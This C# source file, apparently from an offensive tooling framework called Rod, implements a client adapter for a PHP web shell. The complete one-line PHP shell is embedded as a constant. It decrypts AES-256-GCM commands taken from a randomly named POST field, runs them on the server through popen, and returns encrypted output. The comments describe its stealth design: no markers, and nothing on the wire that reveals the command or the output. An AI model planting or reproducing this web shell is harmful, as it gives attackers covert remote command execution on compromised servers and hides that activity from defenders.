using System.Security.Cryptography;
using System.Text;

namespace Rod.Transport.WebShells;

/// <summary>
/// The Rod-native PHP web shell (the independent in-tree family): a
/// one-line placed script whose only secret is a 256-bit key baked at
/// generation, and a channel sealed as AES-256-GCM under that key in both
/// directions -- no connection password, no markers, no third-party
/// protocol shape. One request is one POST form value under a random
/// parameter name, the value <c>base64(nonce ‖ ciphertext ‖ tag)</c>;
/// the whole response body answers in the same shape, so nothing on the
/// wire names the command or the output and a wrong key answers nothing.
///
/// The command runs through the standard, documented process functions --
/// the same PATH setup and read pipe the one-liner family's template
/// uses, because that part is just how PHP runs a command. No
/// function-fallback chains and no bypass logic: those belong to
/// out-of-tree tradecraft (architecture.md Sec 13).
/// </summary>
public sealed class RodPhpAdapter : IWebShellProtocolAdapter
{
    private const int KeyBytes = 32;
    private const int NonceBytes = 12;
    private const int TagBytes = 16;

    public string Id => "rod-php";
    public string ScriptLanguage => "php";
    public string DefaultEncoder => "aes-256-gcm";
    public string DefaultDecoder => "aes-256-gcm";

    public string GenerateCredential()
        => Convert.ToBase64String(RandomNumberGenerator.GetBytes(KeyBytes));

    public bool IsValidCredential(string credential)
    {
        try
        {
            return Convert.FromBase64String(credential).Length == KeyBytes;
        }
        catch (FormatException)
        {
            return false;
        }
    }

    public string CredentialHint => "the base64 of a 256-bit key";

    public string? ReadCredentialFromScript(string script)
    {
        const string prefix = "base64_decode('";
        var start = script.IndexOf(prefix, StringComparison.Ordinal);
        if (start < 0)
            return null;
        var from = start + prefix.Length;
        var end = script.IndexOf("')", from, StringComparison.Ordinal);
        return end < 0 ? null : script[from..end];
    }

    public string RenderScript(string credential)
        => Script.Replace(KeyPlaceholder, credential);

    public WebShellRequest EncodeCommand(
        string url,
        string credential,
        string encoder,
        string decoder,
        string command)
    {
        if (encoder != DefaultEncoder)
            throw new NotSupportedException($"The {Id} adapter implements the {DefaultEncoder} encoder, not '{encoder}'.");
        if (decoder != DefaultDecoder)
            throw new NotSupportedException($"The {Id} adapter implements the {DefaultDecoder} decoder, not '{decoder}'.");
        var key = ParseKey(credential);

        var plain = Encoding.UTF8.GetBytes(command);
        var nonce = RandomNumberGenerator.GetBytes(NonceBytes);
        var ciphertext = new byte[plain.Length];
        var tag = new byte[TagBytes];
        using (var aes = new AesGcm(key, TagBytes))
            aes.Encrypt(nonce, plain, ciphertext, tag);

        // The parameter name is random per request; the placed script
        // reads the first POST value whatever it is called, so nothing
        // fixed rides on the wire.
        var parameter = WebShellAdapters.RandomToken(8, 14);
        var value = new byte[NonceBytes + ciphertext.Length + TagBytes];
        nonce.CopyTo(value.AsSpan(0, NonceBytes));
        ciphertext.CopyTo(value.AsSpan(NonceBytes, ciphertext.Length));
        tag.CopyTo(value.AsSpan(NonceBytes + ciphertext.Length, TagBytes));

        return new WebShellRequest(
            url,
            new Dictionary<string, string> { [parameter] = Convert.ToBase64String(value) },
            TagStart: "",
            TagEnd: "",
            credential);
    }

    public string? DecodeResponse(WebShellRequest request, string decoder, ReadOnlySpan<char> body)
    {
        if (decoder != DefaultDecoder)
            throw new NotSupportedException($"The {Id} adapter implements the {DefaultDecoder} decoder, not '{decoder}'.");
        var key = ParseKey(request.Credential);

        byte[] sealedBody;
        try
        {
            sealedBody = Convert.FromBase64String(body.Trim().ToString());
        }
        catch (FormatException)
        {
            // Not the base64 this protocol answers in -- an endpoint
            // speaking some other shape.
            return null;
        }
        if (sealedBody.Length < NonceBytes + TagBytes)
            return null;

        var nonce = sealedBody.AsSpan(0, NonceBytes);
        var ciphertext = sealedBody.AsSpan(NonceBytes, sealedBody.Length - NonceBytes - TagBytes);
        var tag = sealedBody.AsSpan(NonceBytes + ciphertext.Length, TagBytes);
        var plain = new byte[ciphertext.Length];
        try
        {
            using var aes = new AesGcm(key, TagBytes);
            aes.Decrypt(nonce, ciphertext, tag, plain);
        }
        catch (CryptographicException)
        {
            // A tampered body or a wrong key: the protocol's own refusal,
            // the same null a marker-less answer gets.
            return null;
        }
        return Encoding.UTF8.GetString(plain);
    }

    private static byte[] ParseKey(string credential)
    {
        byte[] key;
        try
        {
            key = Convert.FromBase64String(credential);
        }
        catch (FormatException)
        {
            throw new NotSupportedException(
                $"The {nameof(RodPhpAdapter)} credential is the base64 of a 256-bit key.");
        }
        if (key.Length != KeyBytes)
            throw new NotSupportedException(
                $"The {nameof(RodPhpAdapter)} credential is the base64 of a 256-bit key, not {key.Length * 8} bits.");
        return key;
    }

    private const string KeyPlaceholder = "__ROD_KEY__";

    // The placed script: decode the key, take the first POST value, split
    // it into nonce/ciphertext/tag at the fixed offsets, run the decrypted
    // command through the standard popen read pipe, and answer with a
    // fresh nonce sealing the output. One line, no markers, no second
    // request shape -- the whole footprint is this line and the key in it.
    private const string Script = """
        <?php $k=base64_decode('__ROD_KEY__');if(!empty($_POST)){$v=base64_decode(reset($_POST));if($v!==false&&strlen($v)>=28){$c=openssl_decrypt(substr($v,28),'aes-256-gcm',$k,OPENSSL_RAW_DATA,substr($v,0,12),substr($v,-16));if($c!==false){$d=dirname($_SERVER['SCRIPT_FILENAME']);if(substr($d,0,1)==='/'){@putenv('PATH='.getenv('PATH').':/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');}else{@putenv('PATH='.getenv('PATH').';C:\Windows\system32;C:\Windows;C:\Windows\System32\WindowsPowerShell\v1.0\');}$p=@popen($c,'r');$o='';if($p){while(!@feof($p)){$o.=@fread($p,4096);}@pclose($p);}$n=random_bytes(12);$t='';$e=openssl_encrypt($o,'aes-256-gcm',$k,OPENSSL_RAW_DATA,$n,$t);echo base64_encode($n.$e.$t);die();}}}?>
        """;
}
